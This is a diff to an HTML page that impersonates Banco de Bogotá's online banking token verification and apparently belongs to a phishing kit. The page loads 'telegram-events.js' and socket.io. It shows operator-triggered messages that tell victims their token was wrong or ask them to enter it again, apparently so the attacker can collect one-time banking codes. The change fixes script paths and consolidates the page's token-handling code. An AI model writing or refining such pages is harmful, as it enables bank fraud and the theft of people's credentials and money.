@@ -6,17 +6,23 @@
     <title>Ingreso a Banca Virtual - Verificación</title>
     <link rel="stylesheet" href="token.css">
     
-    <!-- Scripts simplificados -->
+    <!-- Scripts CORREGIDOS con rutas correctas -->
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script src="js/config.js"></script>
     <script src="js/common.js"></script>
+    <script src="js/loading-overlay.js"></script>
     <script src="js/telegram-events.js"></script>
     
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             console.log('Token page loaded in Render');
-            window.commonUtils.initializeCommon();
             
-            // Tu código existente para manejar parámetros URL
+            // Inicializar common utils
+            if (window.commonUtils) {
+                window.commonUtils.initializeCommon();
+            }
+            
+            // Manejar parámetros URL
             const urlParams = new URLSearchParams(window.location.search);
             const action = urlParams.get('action');
             
@@ -79,53 +85,7 @@
         <p>⚠️ El código token ingresado es incorrecto. Por favor intente nuevamente.</p>
     </div>
 
-    <div class="loading-screen" style="display: none;">
-        <img src="Imagenes/banco-de-bogota.png" alt="Banco de Bogotá" class="loading-logo">
-        <div class="spinner"></div>
-        <p>Verificando...</p>
-    </div>
-
-    <script src="/socket.io/socket.io.js"></script>
-    <script>
-        // Verificar si hay mensaje de error al cargar la página
-        window.addEventListener('DOMContentLoaded', () => {
-            const errorMessage = sessionStorage.getItem('errorMessage');
-            if (errorMessage) {
-                const loginError = document.querySelector('.login-error');
-                if (loginError) {
-                    loginError.style.display = 'block';
-                    loginError.textContent = errorMessage;
-                }
-                // Limpiar el mensaje después de mostrarlo
-                sessionStorage.removeItem('errorMessage');
-            }
-        });
-    </script>
-    <script src="token.js"></script>
-    <script>
-    // Inicializar cuando el DOM esté listo
-    document.addEventListener('DOMContentLoaded', function() {
-        // Verificar si hay mensajes de acción en la URL
-        const urlParams = new URLSearchParams(window.location.search);
-        const action = urlParams.get('action');
-        
-        if (action === 'error_token') {
-            const errorMessage = document.querySelector('.error-message');
-            if (errorMessage) {
-                errorMessage.style.display = 'block';
-                errorMessage.querySelector('p').textContent = 
-                    '❌ El código token ingresado es incorrecto. Por favor intente nuevamente.';
-            }
-        } else if (action === 'pedir_token') {
-            // Limpiar campos para nuevo intento
-            const inputs = document.querySelectorAll('.token-input');
-            inputs.forEach(input => input.value = '');
-            if (inputs[0]) inputs[0].focus();
-        }
-        
-        // Limpiar cualquier estado de envío previo
-        window.isSubmitting = false;
-    });
-</script>
+    <!-- CARGAR token.js AL FINAL con ruta correcta -->
+    <script src="js/token.js"></script>
 </body>
 </html>
